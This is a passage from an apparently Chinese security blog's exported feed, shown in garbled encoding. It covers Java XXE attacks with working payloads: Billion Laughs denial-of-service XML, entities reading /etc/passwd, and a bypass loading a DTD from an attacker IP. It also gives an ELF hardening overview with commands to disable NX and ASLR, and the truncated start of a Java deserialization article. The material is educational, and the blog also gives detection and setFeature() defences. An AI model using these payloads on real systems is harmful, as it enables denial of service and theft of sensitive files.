XXEæ”»å‡»åˆ©ç”¨å…¶å®žå‰é¢çš„æµ‹è¯•è¿‡ç¨‹å·²ç»æ˜¯ä¸€äº›åˆ©ç”¨æ–¹å¼äº†ï¼Œå¦‚è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ç­‰ï¼Œä½†æ˜¯å‰ææ˜¯è¯¥XMLæ³¨å…¥æ˜¯æœ‰å›žæ˜¾çš„ã€‚ è¿™é‡Œç¤ºä¾‹æµ‹è¯•ä¸€äº›å¸¸ç”¨çš„ï¼Œå…¶ä»–çš„æ›´è¯¦ç»†çš„ä»¥åŽé‡åˆ°å†è¡¥å……å§ã€‚ 1ã€DoSæ”»å‡»åœ¨Javaä¸­ï¼ŒXXEçš„DoSæ”»å‡»åªå¯¹ä½Žç‰ˆæœ¬çš„JDKæœ‰æ•ˆï¼Œè€Œé«˜ç‰ˆæœ¬çš„JDKä¼šè¿›è¡Œé˜²å¾¡ã€‚ ï¼ˆ2ï¼‰Billion Laughs æ”»å‡»ç»å…¸çš„ç”¨äºŽDoSçš„xmlæ–‡ä»¶æ ·ä¾‹å¦‚ä¸‹ï¼ŒåŽŸç†ä¸ºæž„é€ æ¶æ„çš„XMLå®žä½“æ–‡ä»¶è€—å°½å¯ç”¨å†…å­˜ï¼Œå› ä¸ºè®¸å¤šXMLè§£æžå™¨åœ¨è§£æžXMLæ–‡æ¡£æ—¶å€¾å‘äºŽå°†å®ƒçš„æ•´ä¸ªç»“æž„ä¿ç•™åœ¨å†…å­˜ä¸­ï¼š 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; è¿™ä¸ªåœ¨å…¶ä»–ç¼–ç¨‹è¯­è¨€æˆ–è€…JDKç‰ˆæœ¬è¾ƒä½Žçš„Javaä¸­å¯åˆ©ç”¨ï¼Œä½†åœ¨é«˜ç‰ˆæœ¬JDKçš„çŽ¯å¢ƒä¸­ä¼šæŠ¥é”™ä¸­æ–­è§£æžï¼š å½“ç„¶ï¼Œè¿™ç§ç±»åž‹çš„DoSæ”»å‡»ä¹Ÿæ”¯æŒå‚æ•°å®žä½“çš„æ–¹å¼ã€‚å°†dos.xmlä¿®æ”¹å¦‚ä¸‹ï¼š 1234&lt;!DOCTYPE data SYSTEM &quot;http://192.168.17.136:8000/dos.dtd&quot; [&lt;!ELEMENT data (#PCDATA)&gt;]&gt;&lt;data&gt;&amp;tea;&lt;/data&gt; åœ¨æ”»å‡»è€…æœåŠ¡å™¨æ”¾ç½®dos.dtdï¼š 123456&lt;!ENTITY % a0 &quot;dos&quot; &gt;&lt;!ENTITY % a1 &quot;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;&quot;&gt;&lt;!ENTITY % a2 &quot;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;&quot;&gt;&lt;!ENTITY % a3 &quot;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;&quot;&gt;&lt;!ENTITY % a4 &quot;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;&quot;&gt;&lt;!ENTITY tea &quot;%a4;&quot; &gt; è‡ªå·±å¯æ›´æ¢ä½Žç‰ˆæœ¬JDKè¿›è¡Œæµ‹è¯•ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†ã€‚ ï¼ˆ2ï¼‰æ”¯æŒå®žä½“æµ‹è¯•ä¸»è¦æ˜¯åˆ©ç”¨æ™®é€šå®žä½“ELEMENTï¼Œå¦‚æžœè§£æžè¿‡ç¨‹å˜çš„éžå¸¸ç¼“æ…¢ï¼Œåˆ™è¡¨æ˜Žæµ‹è¯•æˆåŠŸï¼Œå³ç›®æ ‡è§£æžå™¨é…ç½®ä¸å®‰å…¨å¯èƒ½é­å—è‡³å°‘ä¸€ç§DDoSæ”»å‡»ï¼š 1234567&lt;!DOCTYPE data [&lt;!ELEMENT data (#ANY)&gt;&lt;!ENTITY a0 &quot;dos&quot; &gt;&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;]&gt;&lt;data&gt;&amp;a2;&lt;/data&gt; ï¼ˆ3ï¼‰XML äºŒæ¬¡çˆ†ç ´ DDoS æ”»å‡»1234&lt;!DOCTYPE data [&lt;!ENTITY a0 &quot;dosdosdosdosdosdos...dos&quot;]&gt;&lt;data&gt;&amp;a0;&amp;a0;...&amp;a0;&lt;/data&gt; ï¼ˆ4ï¼‰ä¸€èˆ¬å®žä½“é€’å½’æœ€å¥½ä¸è¦ä½¿ç”¨é€’å½’ï¼š 12345&lt;!DOCTYPE data [&lt;!ENTITY a &quot;a&amp;b;&quot; &gt;&lt;!ENTITY b &quot;&amp;a;&quot; &gt;]&gt;&lt;data&gt;&amp;a;&lt;/data&gt; ï¼ˆ5ï¼‰å¤–éƒ¨ä¸€èˆ¬å®žä½“è¿™ç§æ”»å‡»æ–¹å¼æ˜¯é€šè¿‡ç”³æ˜Žä¸€ä¸ªå¤–éƒ¨ä¸€èˆ¬å®žä½“ï¼Œç„¶åŽå¼•ç”¨ä½äºŽç½‘ä¸Šæˆ–æœ¬åœ°çš„ä¸€ä¸ªå¤§æ–‡ä»¶(ä¾‹å¦‚ï¼šC:/pagefile.sys æˆ– /dev/random)ã€‚æ¢å¥è¯è¯´ï¼Œå°±æ˜¯è®©è§£æžå™¨è§£æžä¸€ä¸ª å·¨å¤§çš„ XML æ–‡ä»¶ä»Žè€Œå¯¼è‡´DoSã€‚ 12345&lt;?xml version=&apos;1.0&apos;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY dos SYSTEM &quot;file:///publicServer.com/largeFile.xml&quot; &gt;]&gt;&lt;data&gt;&amp;dos;&lt;/data&gt; 2ã€åŸºæœ¬XXEæ”»å‡»æœ‰å›žæ˜¾çš„XXEæ”»å‡»è¿™ç§æ”»å‡»å°±æ˜¯æ¼æ´žéªŒè¯æ—¶åˆ©ç”¨çš„ç¬¬3ã€4æ­¥çš„ç¤ºä¾‹ï¼Œå¦‚ï¼š 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [ &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt; ]&gt;&lt;user&gt; &lt;name&gt;Mi1k7ea&lt;/name&gt; &lt;sex&gt;&amp;foo;&lt;/sex&gt; &lt;age&gt;20&lt;/age&gt;&lt;/user&gt; ä½†æ˜¯è¿™ç§æ”»å‡»æ–¹å¼æ˜¯éœ€è¦ä¸€ä¸ªç›´æŽ¥çš„åé¦ˆé€šé“å³å¯ä»¥å›žæ˜¾æ•°æ®ï¼Œå¹¶ä¸”è¯»å–æ–‡ä»¶å—åˆ°XMLä¸­ç¦æ­¢å­—ç¬¦çš„é™åˆ¶ï¼Œå¦‚ â€œ&lt;â€ å’Œ â€œ&amp;â€ã€‚å¦‚æžœè¿™äº›è¢«ç¦æ­¢çš„å­—ç¬¦å‡ºçŽ°åœ¨è¦è®¿é—®çš„æ–‡ä»¶ä¸­(å¦‚ï¼š/etc/fstab)ï¼Œåˆ™ XML è§£æžå™¨ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯å¹¶åœæ­¢è§£æžã€‚ ä½¿ç”¨ netdoc çš„ XXE æ”»å‡»ä¸»è¦å°†file://æ¢æˆnetdoc:/ï¼Œå¦‚ä¸‹ï¼š 123456&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#PCDATA)&gt;&lt;!ENTITY file SYSTEM &quot;netdoc:/etc/passwd&quot;&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt; 3ã€ç»•è¿‡åŸºæœ¬XXEæ”»å‡»çš„é™åˆ¶bypass.xml 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE data [ &lt;!ELEMENT data (#ANY)&gt; &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt; &lt;!ENTITY % goodies SYSTEM &quot;file://e:/passwd&quot;&gt; &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.17.136:8000/bypass.dtd&quot;&gt; %dtd;]&gt;&lt;data&gt;&amp;all;&lt;/data&gt; bypass.dtd æ£€æµ‹æ–¹æ³•1ã€åœ¨Javaé¡¹ç›®ä¸­æœç´¢javax.xml.parsersä¸‹çš„DocumentBuilderFactoryå’ŒDocumentBuilderï¼ŒæŽ’æŸ¥æ˜¯å¦ä½¿ç”¨äº†è¯¥APIè§£æžXMLæ–‡æ¡£å†…å®¹ï¼› 2ã€è‹¥ä½¿ç”¨äº†ï¼Œåˆ™è¿›ä¸€æ­¥æŽ’æŸ¥æ˜¯å¦ç¦ç”¨äº†ä¸å®‰å…¨çš„æ“ä½œï¼Œå…·ä½“çš„æ˜¯çœ‹setFeature()çš„è®¾ç½®æ˜¯å¦å­˜åœ¨ç»•è¿‡çš„å¯èƒ½ã€‚ é˜²å¾¡æ–¹æ³•æ­£ç¡®åœ°è®¾ç½®setFeature()æ¥è¿›è¡Œé˜²å¾¡ï¼Œåœ¨åˆ›å»ºå‡ºæ–°çš„DocumentBuilderFactoryå®žä¾‹ä¹‹åŽå°±è°ƒç”¨ï¼š 1234567891011121314151617181920212223public static void documentBuilder(File f)&#123; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); try &#123; //é˜²å¾¡XMLæ³¨å…¥ factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); factory.setFeature("http://xml.org/sax/features/external-general-entities", false); factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false); factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false); DocumentBuilder builder = factory.newDocumentBuilder(); //è§£æžxmlæ–‡æ¡£ï¼Œå…ˆèŽ·å– Document doc = builder.parse(f); //é€šè¿‡useråå­—æ¥èŽ·å–domèŠ‚ç‚¹ NodeList nodeList = doc.getElementsByTagName("user"); Element e = (Element)nodeList.item(0); //èŽ·å–å€¼ System.out.println("å§“åï¼š"+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue()); System.out.println("æ€§åˆ«ï¼š"+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue()); System.out.println("å¹´é¾„ï¼š"+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; å†æ¬¡æµ‹è¯•ä¹‹å‰çš„payloadï¼Œéƒ½æ²¡æœ‰æˆåŠŸï¼š è‡³äºŽsetFeature()çš„è¯¦ç»†é…ç½®å¯æŸ¥é˜…ï¼šhttp://xerces.apache.org/xerces2-j/features.html å‚è€ƒDTD/XXE æ”»å‡»ç¬”è®°åˆ†äº« XMLå¤–éƒ¨å®žä½“ï¼ˆXXEï¼‰æ³¨å…¥è¯¦è§£]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ELFå®‰å…¨é˜²å¾¡æœºåˆ¶å°ç»“]]></title>
    <url>%2F2019%2F02%2F09%2FELF%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[è¿™é‡Œä¸»è¦ä»‹ç»ä¸€ä¸‹Linuxä¸‹ELFæ–‡ä»¶çš„ä¸€äº›å®‰å…¨é˜²å¾¡æœºåˆ¶åŠå…¶åŽŸç†ï¼Œå…¶åœ¨äºŒè¿›åˆ¶å®‰å…¨å’ŒPwnä¸Šç»å¸¸ä¼šç¢°åˆ°ï¼Œè‡³äºŽå„ä¸ªç±»åž‹çš„ç»•è¿‡æŠ€å·§åŽé¢ä¼šè¡¥å……ã€‚ NXï¼ˆDEPï¼‰NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆå³Windowsä¸Šç±»ä¼¼çš„DEPï¼‰çš„åŸºæœ¬åŽŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯åŽ»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚ é€šå¸¸å¼€å¯äº†NXåŽï¼Œå³ä½¿æœ‰æ ˆæº¢å‡ºæ¼æ´žä¹Ÿæ‰§è¡Œä¸äº†å†™åœ¨æ ˆä¸Šçš„shellcodeï¼Œä½†æ˜¯å¯é€šè¿‡ROPæ–¹å¼æ¥ç»•è¿‡NXè·³è½¬è‡³å…¶ä»–åœ°æ–¹æ‰§è¡Œã€‚ gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æžœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚ä¾‹å¦‚ï¼šgcc -z execstack -o test test.c åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚ ç½‘ä¸Šæ‰¾çš„ç¤ºä¾‹å›¾ï¼š PIEï¼ˆASLRï¼‰PIEï¼ˆPosition-Independent Executablesï¼‰ä½ç½®æ— å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå’ŒWindowsä¸‹çš„ASLRï¼ˆAddress Space Layout Randomization)æœºåˆ¶ç±»ä¼¼ï¼ŒPIE enabledè¡¨ç¤ºç¨‹åºå¼€å¯åœ°å€éšæœºåŒ–é€‰ã€æ„å‘³ç€ç¨‹åºæ¯æ¬¡è¿è¡Œçš„æ—¶å€™åœ°å€éƒ½ä¼šå˜åŒ–ï¼Œè€Œå¦‚æžœæ²¡æœ‰å¼€PIEçš„è¯é‚£ä¹ˆNo PIE (0x400000)ï¼Œæ‹¬å·å†…çš„æ•°æ®å°±æ˜¯ç¨‹åºçš„åŸºåœ°å€ã€‚ ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆDEPï¼‰å’ŒPIEï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚ PIEæœºåˆ¶æœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š â€‹ 0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚ â€‹ 1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚ â€‹ 2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢žåŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚ å¯ä»¥é˜²èŒƒåŸºäºŽRet2libcæ–¹å¼çš„é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç ã€‚ Built as PIEï¼šä½ç½®ç‹¬ç«‹çš„å¯æ‰§è¡ŒåŒºåŸŸPIEã€‚è¿™æ ·ä½¿å¾—åœ¨åˆ©ç”¨ç¼“å†²æº¢å‡ºå’Œç§»åŠ¨æ“ä½œç³»ç»Ÿä¸­å­˜åœ¨çš„å…¶ä»–å†…å­˜å´©æºƒç¼ºé™·æ—¶é‡‡ç”¨é¢å‘è¿”å›žçš„ç¼–ç¨‹ROPï¼ˆreturn-oriented programmingï¼‰æ–¹æ³•å˜å¾—éš¾å¾—å¤šã€‚ liunxä¸‹å…³é—­PIEçš„å‘½ä»¤å¦‚ä¸‹ï¼šsudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space RELRORELROï¼ˆRelocation Read Onlyï¼‰é‡å®šå‘åªè¯»ï¼Œå®žçŽ°å°±æ˜¯ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åŽçš„åŒºåŸŸä¸ºåªè¯»ã€‚é€šè¿‡è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æžå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä¿æŠ¤åº“å‡½æ•°çš„è°ƒç”¨ä¸å—æ”»å‡»è€…é‡å®šä½çš„å½±å“ï¼Œä»Žè€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚ RELROæœ‰Partial RELROå’ŒFULL RELROä¸¤ä¸ªé€‰é¡¹ï¼Œå¦‚æžœå¼€å¯FULL RELROï¼Œæ„å‘³ç€æ— æ³•ä¿®æ”¹GOTè¡¨ï¼›å¦‚æžœä¸ºPartial RELROï¼Œè¯´æ˜Žå¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚ å¯é€šè¿‡ROPç»•è¿‡ã€‚ FORTIFYFortify æŠ€æœ¯æ˜¯GCCåœ¨ç¼–è¯‘æºç æ—¶åˆ¤æ–­ç¨‹åºçš„å“ªäº›bufferä¼šå­˜åœ¨å¯èƒ½çš„æº¢å‡ºï¼Œåœ¨bufferå¤§å°å·²çŸ¥çš„æƒ…å†µä¸‹ï¼ŒGCCä¼šæŠŠ strcpyã€memcpy,ã€memsetç­‰å‡½æ•°è‡ªåŠ¨æ›¿æ¢æˆç›¸åº”çš„ __strcpy_chk(dst, src, dstlen)ç­‰å‡½æ•°ï¼Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨ã€‚ FORTIFY_SOURCEæœºåˆ¶å¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æœ‰ä¸¤ä¸ªé™åˆ¶ï¼š â€‹ (1)åŒ…å«%nçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸èƒ½ä½äºŽç¨‹åºå†…å­˜ä¸­çš„å¯å†™åœ°å€ï¼› â€‹ (2)å½“ä½¿ç”¨ä½ç½®å‚æ•°æ—¶ï¼Œå¿…é¡»ä½¿ç”¨èŒƒå›´å†…çš„æ‰€æœ‰å‚æ•°ã€‚ä¾‹å¦‚è¦ä½¿ç”¨%4$xï¼Œåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨1ã€2ã€3ã€‚ GCCä¸­-D_FORTIFY_SOURCE=2æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œä½†æ˜¯åªæœ‰å¼€å¯O2æˆ–ä»¥ä¸Šä¼˜åŒ–çš„æ—¶å€™ï¼Œè¿™ä¸ªé€‰é¡¹æ‰ä¼šè¢«çœŸæ­£æ¿€æ´»ã€‚ å¦‚æžœæŒ‡å®š-D_FORTIFY_SOURCE=1ï¼Œé‚£åŒæ ·ä¹Ÿè¦å¼€å¯O1æˆ–ä»¥ä¸Šä¼˜åŒ–ï¼Œè¿™ä¸ªé€‰é¡¹æ‰ä¼šè¢«çœŸæ­£æ¿€æ´»ã€‚ å¯ä»¥ä½¿ç”¨-U_FORTIFY_SOURCEæˆ–è€…-D_FORTIFY_SOURCE=0æ¥ç¦ç”¨ã€‚ å¦‚æžœå¼€å¯äº†-D_FORTIFY_SOURCE=2ï¼Œé‚£ä¹ˆè°ƒç”¨__printf_chkå‡½æ•°çš„æ—¶å€™ä¼šæ£€æŸ¥format stringä¸­æ˜¯å¦å­˜åœ¨%nï¼Œå¦‚æžœå­˜åœ¨%n è€Œä¸”format stringæ˜¯åœ¨ä¸€ä¸ªå¯å†™çš„segmentä¸­çš„ï¼ˆä¸æ˜¯åœ¨read-onlyå†…å­˜æ®µä¸­ï¼‰ï¼Œé‚£ä¹ˆç¨‹åºä¼šæŠ¥é”™å¹¶ç»ˆæ­¢ã€‚å¦‚æžœæ˜¯å¼€å¯-D_FORTIFY_SOURCE=1ï¼Œé‚£ä¹ˆå°±ä¸ä¼šæŠ¥é”™ã€‚ CANARYï¼ˆStackï¼‰Stackï¼Œæ ˆæº¢å‡ºæ£€æŸ¥ï¼Œç”¨Canaryæ˜¯å¦å˜åŒ–æ¥æ£€æµ‹ï¼Œå…¶ä¸­Canary foundè¡¨ç¤ºå¼€å¯ã€‚ Canaryæ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼šå¯ç”¨æ ˆä¿æŠ¤åŽï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›žçš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æžœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›žåœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æŽ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxå°†cookieä¿¡æ¯ç§°ä¸ºCanaryã€‚ å¦‚æžœæ ˆä¸­å¼€å¯Canary foundï¼Œé‚£ä¹ˆå°±ä¸èƒ½ç”¨ç›´æŽ¥ç”¨æº¢å‡ºçš„æ–¹æ³•è¦†ç›–æ ˆä¸­è¿”å›žåœ°å€ï¼Œè€Œä¸”è¦é€šè¿‡æ”¹å†™æŒ‡é’ˆä¸Žå±€éƒ¨å˜é‡ã€leak canaryã€overwrite canaryçš„æ–¹æ³•æ¥ç»•è¿‡ã€‚ å‚è€ƒPwnåŸºç¡€çŸ¥è¯†ç¬”è®° è½¯ä»¶å¸¸ç”¨å®‰å…¨é˜²æŠ¤æ‰‹æ®µ checksec æ€»ç»“]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶åŸºç¡€</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javaååºåˆ—åŒ–æ¼æ´ž]]></title>
    <url>%2F2019%2F02%2F06%2FJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[åœ¨å­¦ä¹ Javaååºåˆ—åŒ–æ¼æ´žä¹‹å‰ï¼Œå»ºè®®å…ˆç†Ÿæ‚‰Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚ åœ¨ååºåˆ—åŒ–æ¼æ´žä¸­ï¼ŒJavaç±»ååºåˆ—åŒ–æ¼æ´žè¾ƒPHPå’ŒPythonçš„ç›¸æ¯”ï¼Œæ˜¾å¾—ç¨å¾®å¤æ‚ä¸€äº›ã€‚ä¸»è¦æ˜¯è¦æ±‚å¯¹Javaè¾ƒä¸ºç†Ÿæ‚‰ã€‚ä¸‹é¢å°ç»“ä¸€ä¸‹Javaååºåˆ—åŒ–æ¼æ´žçš„ç›¸å…³å†…å®¹ã€‚ ä½•ä¸ºJavaååºåˆ—åŒ–æ¼æ´žå½“å¼€å‘è€…è‡ªå®šä¹‰å®žçŽ°Serializableã€æ·»åŠ è‡ªå·±çš„readObject()æ–¹æ³•æ—¶ï¼Œè‹¥readObject()æ–¹æ³•å†…ä»£ç é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œåˆ™å¯èƒ½å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´žçš„é£Žé™©ã€‚å¦‚æžœæ­¤æ—¶JavaæœåŠ¡çš„ååºåˆ—åŒ–APIå…è®¸å¤–éƒ¨ç”¨æˆ·ä½¿ç”¨ï¼Œåˆ™ä¼šå¯¼è‡´æ”»å‡»è€…ä½¿ç”¨ç²¾å¿ƒæž„é€ çš„payloadæ¥åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´žè¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚ Javaååºåˆ—åŒ–ä¸­readObject()æ–¹æ³•çš„ä½œç”¨ç›¸å½“äºŽPHPååºåˆ—åŒ–ä¸­çš„é­”æœ¯å‡½æ•°ï¼Œä½¿ååºåˆ—åŒ–è¿‡ç¨‹åœ¨ä¸€å®šç¨‹åº¦ä¸Šå—æŽ§æˆä¸ºå¯èƒ½ï¼Œæ˜¯å¦çœŸçš„å¯æŽ§ï¼Œè¿˜éœ€åˆ†æžæ¯ä¸ªå¯¹è±¡çš„readObject()æ–¹æ³•å…·ä½“æ˜¯å¦‚ä½•å®žçŽ°çš„ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œåœ¨Javaçš„readObject()æ–¹æ³•ä¸­å¾ˆå°‘ä¼šåƒCTFä¸­PHPçš„ååºåˆ—åŒ–æ¼æ´žé¢˜ç›®ä¸€æ ·ç›´æŽ¥å°†æ¼æ´žä»£ç å†™åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œè¿™æ—¶å°±éœ€è¦åŽ»æž„é€ åå°„é“¾æ¥è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚ é‡å†™readObject()ç¤ºä¾‹Javaååºåˆ—åŒ–æ¼æ´žçš„æ ¹æºåœ¨äºŽé‡å†™readObject()æ–¹æ³•å¯¼è‡´å­˜åœ¨æ¼æ´žä»£ç ã€‚ readObject()æ–¹æ³•é‡å†™çš„æ ¼å¼å¦‚ä¸‹ï¼š 1private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException æ³¨æ„ï¼ŒreadObject()æ–¹æ³•è¢«å®šä¹‰æˆäº†privateï¼Œå¹¶ä¸”æ˜¯å¿…é¡»å°è¯•æ•èŽ·IOExceptionå’ŒClassNotFoundExceptionçš„å¼‚å¸¸ã€‚ è¿™é‡Œå†è´´å¦å¤–ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ï¼Œåˆ›å»ºä¸€ä¸ªä¸å®‰å…¨çš„ç±»å¯¹è±¡ï¼Œèµ‹å€¼å…¶nameå±žæ€§å¹¶åºåˆ—åŒ–ä¸ºæ–‡ä»¶ä¿å­˜èµ·æ¥ï¼ŒæŽ¥ç€é€šè¿‡ååºåˆ—åŒ–è¯¥æ–‡ä»¶èŽ·å–è¯¥å¯¹è±¡åŠå…¶å±žæ€§å€¼ï¼Œé€šè¿‡é‡å†™readObject()æ–¹æ³•åœ¨è°ƒç”¨é»˜è®¤çš„readObject()æ–¹æ³•ä¹‹åŽæ·»åŠ ä¸€æ¡æ‰§è¡Œè®¡ç®—å™¨çš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class test &#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = "Mi1k7ea"; System.out.println("[*]åºåˆ—åŒ–å¯¹è±¡"); FileOutputStream fos = new 